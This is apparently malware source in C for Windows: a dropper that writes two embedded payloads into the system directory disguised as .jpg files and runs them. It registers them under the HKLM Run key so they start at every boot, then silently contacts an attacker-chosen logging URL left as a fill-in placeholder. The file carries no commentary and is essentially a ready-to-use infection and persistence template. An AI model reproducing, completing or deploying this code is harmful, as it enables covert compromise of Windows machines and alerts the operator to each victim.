   #include <stdio.h>
   #include <stdlib.h>
   #include <process.h>
   #include <windows.h>
   #include <wininet.h>
   void regkey(char thepath[],char filename[],char regname[]);










   int main()
   {
   HANDLE file;
   char sysdir[MAX_PATH];
   char newfile1[MAX_PATH];
   char newfile2[MAX_PATH];
   DWORD written;


   GetSystemDirectory(sysdir, MAX_PATH);
   sprintf(newfile1, "%s\\%s", sysdir, "Constructor.Win32.A2Vbs.a-01.jpg");
   sprintf(newfile2, "%s\\%s", sysdir, "Constructor.Win32.A2Vbs.a-02.jpg");

   file = CreateFile(newfile1,GENERIC_WRITE,FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
   WriteFile(file,hexdump1,len1,&written,0);
   CloseHandle(file);
   file = CreateFile(newfile2,GENERIC_WRITE,FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
   WriteFile(file,hexdump2,len2,&written,0);
   CloseHandle(file);



   ShellExecute(0, "open",newfile1,NULL, NULL, SW_SHOW);
   ShellExecute(0, "open",newfile2,NULL, NULL, SW_SHOW);
   regkey(sysdir,"Constructor.Win32.A2Vbs.a-01.jpg","EMM");
   regkey(sysdir,"Constructor.Win32.A2Vbs.a-02.jpg","EMM");
   HINTERNET hInternet = InternetOpen("Mozilla",INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
   LPCTSTR lpszServerName = "Enter host here EX: members.tripod.com";
   HINTERNET hConnect = InternetConnect(hInternet,lpszServerName, INTERNET_DEFAULT_HTTP_PORT ,NULL, NULL,INTERNET_SERVICE_HTTP,0, 0);
   LPCTSTR lpszObjectName = "/Enter path here EX: ~dudeman/log.php";
   DWORD dwOpenRequestFlags = INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_AUTH | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD;
   HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", lpszObjectName, NULL,NULL, NULL,dwOpenRequestFlags, 0);
   HttpSendRequest(hRequest, NULL, 0, NULL, 0);
   ExitProcess(0);
   return 0;
   }
   void regkey(char thepath[],char filename[],char regname[])
   {
      HKEY hKey;
       char szData[50];
       char szPath[MAX_PATH];
       char newfolder[MAX_PATH];
       sprintf(newfolder, "%s\\%s", thepath, filename);
       strcpy(szData, "\"" );
       strcat(szData, newfolder);
       strcat(szData, "\"");
       RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL);
       RegSetValueEx(hKey, regname, 0, REG_SZ, (LPBYTE)szData, sizeof(szData));
       RegCloseKey(hKey);
       }
